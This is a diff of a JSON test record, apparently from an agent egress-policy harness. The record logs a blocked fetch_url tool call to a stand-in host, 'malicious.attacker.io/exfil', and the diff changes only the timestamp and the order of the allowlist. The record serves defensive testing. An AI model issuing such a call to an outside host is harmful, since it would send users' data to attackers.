@@ -1,8 +1,8 @@
 {
   "scenario_id": "S8",
   "kind": "observability_gap",
-  "timestamp": "20260607_133106",
-  "response": "POLICY_VIOLATION: host 'malicious.attacker.io' not in egress allowlist {'httpbin.org', 'example.com'} (origin=egress)",
+  "timestamp": "20260607_135140",
+  "response": "POLICY_VIOLATION: host 'malicious.attacker.io' not in egress allowlist {'example.com', 'httpbin.org'} (origin=egress)",
   "tool": "fetch_url",
   "tool_args": {
     "url": "https://malicious.attacker.io/exfil"
